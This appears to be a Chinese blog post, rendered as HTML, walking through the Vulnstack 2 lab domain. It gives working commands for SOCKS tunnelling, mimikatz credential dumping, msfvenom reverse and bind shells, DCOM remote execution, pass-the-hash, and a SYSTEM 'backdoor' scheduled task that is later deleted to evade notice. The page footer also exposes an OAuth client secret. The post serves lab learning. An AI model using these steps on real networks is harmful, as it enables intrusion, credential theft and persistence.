+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2029.png" alt="Untitled" class="lazyload"></p>
+<p>在跳板机上，也就是 Web机上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.111.128 -e 5555</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2030.png" alt="Untitled" class="lazyload"></p>
+<p>kali 上收到回显，隧道搭建成功</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2031.png" alt="Untitled" class="lazyload"></p>
+<p>接着来配置 kali 上的代理工具，首先增加代理规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2032.png" alt="Untitled" class="lazyload"></p>
+<p>接下来借助搭建好的隧道进行内网横向移动，可以用 kali Ping 通内网 IP 了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2033.png" alt="Untitled" class="lazyload"></p>
+<p>首先扫描内网确定两台主机的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sS -Pn 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>如果出现报错如下</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2034.png" alt="Untitled" class="lazyload"></p>
+<p>解决方法：编辑 <code>/etc/proxychains.conf</code> ，将 <code>proxy_dns</code> 注释，proxychains 不要启用 DNS 代理</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2035.png" alt="Untitled" class="lazyload"></p>
+<p>最后多次运行上述命令都没有成功</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2036.png" alt="Untitled" class="lazyload"></p>
+<p>只能换个思路从 meterpreter 下手了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p>得到内网网段，10.10.10.1&#x2F;24</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2037.png" alt="Untitled" class="lazyload"></p>
+<p>添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2038.png" alt="Untitled" class="lazyload"></p>
+<p>添加成功后我们使用 msf 的 <code>udp_sweep</code> 模块，通过发送 udp 包的形式来探测目标内网内的活跃主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">search udp</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhost 10.10.10.0/24</span><br><span class="line">set threads 50 #线程可以调大点</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2039.png" alt="Untitled" class="lazyload"></p>
+<p>扫描发现内网中DC的ip为10.10.10.10，这里还是探测不到 PC 机，没有弄清楚原因，不知道是靶机设置的问题还是防火墙的原因，希望大佬指点</p>
+<p>这里我们还是先打以下 PC 机</p>
+<p>我们先通过工具扒一下用户的用户名和密码，有了用户名和密码后，通过 Web 机作跳板与 PC 机取得连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload /home/kali/Desktop/Tools/mimikatz_trunk/x63 C:\\</span><br><span class="line">shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd C:\\</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2040.png" alt="Untitled" class="lazyload"></p>
+<p>运行 <code>mimikatz.exe</code> 进入 <code>mimikatz shell</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2041.png" alt="Untitled" class="lazyload"></p>
+<p>成功抓去了 mssql、Administrator、de1ay 三个域用户的用户名和密码，因为结果太长这里就只列出一个了</p>
+<p>知道了 Administrator 的账号密码，接下来可以用它来和 PC 建立连接了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.201\ipc$ &quot;hongrisec@2022&quot; /user:administrator</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2042.png" alt="Untitled" class="lazyload"></p>
+<p>连接建立成功，为了方便后续横向，我们尝试上传一个 msf 马到 PC 上，传马的过程 kali → Web → PC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.111.128 lport=8888 -f exe &gt;haixian.exe</span><br></pre></td></tr></table></figure>
+
+<p>首先上传到WEB上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/kali/haixian.exe</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2043.png" alt="Untitled" class="lazyload"></p>
+<p>再由 Web 机通过刚刚建立的 IPC 连接传到 PC 上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\haixian.exe \\10.10.10.201\c$ /yS</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2044.png" alt="Untitled" class="lazyload"></p>
+<p>然后由 WEB 上的 powershell 通过 DCOM 控制 PC 执行 haixian.exe</p>
+<p>另起一个 msf，开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use /exploit/multi/handler</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 8888 #与 mfsvonem 设置的回弹端口要一样</span><br><span class="line">set payload windows/meterpreter/reverse_tcp #与 mfsvonem 设置的 payload 要一样</span><br><span class="line">exploit8c535a2d84c3b21059d667639bb89db5</span><br></pre></td></tr></table></figure>
+
+<p>用 Web 机的 meterpreter 依次执行下列命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell #加载 powershell </span><br><span class="line">powershell_shell #切换到 powershell 命令行</span><br><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;10.10.10.201&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c C:\haixian.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后，msf 上得到 PC 机的 meterpreter </p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2045.png" alt="Untitled" class="lazyload"></p>
+<p>查看当前权限为管理员</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2046.png" alt="Untitled" class="lazyload"></p>
+<p>PC 机的任务到此就结束了，下面就对域控下手</p>
+<p>之前抓账号密码的时候也抓到了哈希，可以尝试对域控采用哈希传递攻击</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2047.png" alt="Untitled" class="lazyload"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::pth /domain:de1ay.com /user:Administrator /ntlm:8c535a2d84c3b21059d667639bb89db5</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2048.png" alt="Untitled" class="lazyload"></p>
+<p>执行成功后 Web 机上会弹出cmd.exe，或者重新开一个命令行</p>
+<p>这里为了方便展示我直接开了远程桌面，<code>rdesktop 192.168.111.80</code></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2049.png" alt="Untitled" class="lazyload"></p>
+<p>在 mimikatz.exe 目录下生成了新文件</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2050.png" alt="Untitled" class="lazyload"></p>
+<p>mimikatz 中利用 sekurlsa 建立与DC机建立的连接为 IPC 连接</p>
+<blockquote>
+<p>IPC$(Internet Process Connection) 是 NT2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
+</blockquote>
+<p>除了用 mimikatz 建立 IPC 连接外，当我们知道对方用户名和密码时，也可以直接在 cmd 中用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure>
+
+<p>就比如，这里我要使 Web 机 与 DC 机建立 IPC连接，就在在 Web 机的命令行中运行 <code>net use \\10.10.10.1\ipc$ &quot;hongrisec@2022&quot; /user:&quot;administrator&quot;</code> 即可</p>
+<p>然后尝试访问域控的 C 盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>有文章说 dir 后要使用主机名而不能用 IP 否则会报做，但是我这里用了 IP 没有报错，有点不知所以</p>
+</blockquote>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2051.png" alt="Untitled" class="lazyload"></p>
+<p>上述命令通过访问 C 盘判断是否连接成功，还可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>
+
+<p>该命令用于查看当前主机所建立的连接，同样也可以判断是否建立连接</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2052.png" alt="Untitled" class="lazyload"></p>
+<p>接下来就是重复之前的操作了，传个 msf 马上去，这里我们用正向连接的马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /home/kali/shell.exe C:// #上传到web机</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;chcp 65001</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;cd C://</span><br><span class="line">C:\&gt;copy C:\\shell.exe \\DC\c$ #上传到DC机</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2053.png" alt="Untitled" class="lazyload"></p>
+<p>上传完成后开启 msf ，进行与 DC 机的正向连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp #这里一定要先设置 payload</span><br><span class="line">set rhost 10.10.10.10 #设置正向连接目标 IP</span><br><span class="line">set lport 8888 #设置本地接听端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2054.png" alt="Untitled" class="lazyload"></p>
+<p>然后开始在 DC 机运行我们的 msf 马，监听我们的来连接</p>
+<p>通过 Web 机设置 DC 机 Windows 计划任务，利用 <code>schtasks</code> 命令</p>
+<p>在目标主机 DC 上创建一个名称为 backdoor 的计划任务，该计划任务每分钟启动一次，启动程序为我们之前到C盘下的 shell.exe ，启动权限为 system。命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctasks /create /s 10.10.10.10 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p>在没有建立 IPC 连接时，要加上 <code>/u</code> 和 <code>/p</code> 参数分别设置用户名和密码。</p>
+<p>但也有些时候，由于当前权限或组策略设置等原因，该 schtasks 方法远程创建计划任务可能会报错拒绝访问:</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2055.png" alt="Untitled" class="lazyload"></p>
+<p>遇到这种情况，我们可以加上 <code>/u</code> 和 <code>/p</code> 参数分别设置高权限用户名和密码，如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.10 /u administrator /p hongrisec@2022 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p>就可以成功创建计划任务啦：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2056.png" alt="Untitled" class="lazyload"></p>
+<p>然后执行如下命令立即运行该计划任务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.10 /i /tn backdoor  #忽略任何限制立即运行任务</span><br><span class="line">schtasks /run /s 10.10.10.10 /i /tn backdoor /u administrator /p hongrisec@2022 #遇到上面所说的报错时执行加上/u和/p参数分别设置高权限用户名和密码</span><br></pre></td></tr></table></figure>
+
+<p>发现无法 msf 没有收到回弹的 meterpreter，怀疑是防火墙的原因，所以无法连接到 DC 机的 8888 端口，用 <code>telnet 10.10.10.10 8888</code> 探了下 8888 端口，果然无法连接</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2057.png" alt="Untitled" class="lazyload"></p>
+<p>才疏学浅QWQ只能把 DC 的防火墙关了再继续了，再次用 <code>telnet</code> 命令测试 ，发现可以连接了，果然是防火墙的问题，只能怪自己代理这块没学好了，不然用反向连接的 msf 马应该就可以上线了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2058.png" alt="Untitled" class="lazyload"></p>
+<p>重新执行 <code>backdoor</code> 计划任务</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2059.png" alt="Untitled" class="lazyload"></p>
+<p>msf 也成功连接了，并且 <code>getuid</code> 发现是 SYSTEM 权限，省大劲了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2060.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2061.png" alt="Untitled" class="lazyload"></p>
+<p>拿下域控😃</p>
+<p>计划任务成功运行后，执行如下命令强制删除该计划任务，防止管理员查看到异常任务并对主机进行加固（当然实战的时候肯定还要把日志删除的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 10.10.10.10 /tn &quot;backdoor&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>除了就像上面那样利用计划任务执行木马程序获得主机权限外，我们还可以利用 schtasks 计划任务直接执行系统命令，但由于不会回显，所以我们要将执行的结果写入到一个文本文件中，然后利用 <code>type</code> 命令远程读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.10 /tn test /sc minute /mo 1 /tr &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami &gt; C:\Users\Administrator\result.txt&#x27;&quot; /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2062.png" alt="Untitled" class="lazyload"></p>
+<p>立即启动该计划任务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.10 /i /tn test</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2063.png" alt="Untitled" class="lazyload"></p>
+<p>最后利用 <code>type</code> 命令远程查看目标主机上的 result.txt 文件即可，如下图所示，命令执行成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC\c$\Users\Administrator\result.txt</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2064.png" alt="Untitled" class="lazyload"></p>
+<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p>在实战情况下拿下一台主机的最高权限并不意味着渗透的结束，我们还需要利用已经取得的权限在目标主机上留有后门以方便日后的”访问“，这就要涉及到票据这类知识了，等学完 <strong>Kerberos 协议</strong>后再来补充</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sallyzhang/p/13889411.html">https://www.cnblogs.com/sallyzhang/p/13889411.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119087392">https://blog.csdn.net/qq_45300786&#x2F;article&#x2F;details&#x2F;119087392</a></p>
+<p><a target="_blank" rel="noopener" href="https://teamssix.com/210610-164507.html">https://teamssix.com/210610-164507.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangge3663/article/details/109305721">https://blog.csdn.net/zhangge3663/article/details/109305721</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/282762.html">https://www.freebuf.com/articles/network/282762.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/115719280">https://blog.csdn.net/zy15667076526/article/details/115719280</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/115672287?spm=1001.2014.3001.5501">https://blog.csdn.net/zy15667076526/article/details/115672287?spm=1001.2014.3001.5501</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/115672287?spm=1001.2014.3001.5501">https://blog.csdn.net/zy15667076526/article/details/115672287?spm=1001.2014.3001.5501</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/14189154.html">https://www.cnblogs.com/vege/p/14189154.html</a></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>John Doe<br>
+        <strong>Link：</strong><a href="http://example.com/2022/03/23/Vulnstack%202%20%E9%9D%B6%E5%9C%BA%E5%88%9D%E6%8E%A2/" title="http:&#x2F;&#x2F;example.com&#x2F;2022&#x2F;03&#x2F;23&#x2F;Vulnstack%202%20%E9%9D%B6%E5%9C%BA%E5%88%9D%E6%8E%A2&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;example.com&#x2F;2022&#x2F;03&#x2F;23&#x2F;Vulnstack%202%20%E9%9D%B6%E5%9C%BA%E5%88%9D%E6%8E%A2&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="Search" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1648022923356"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
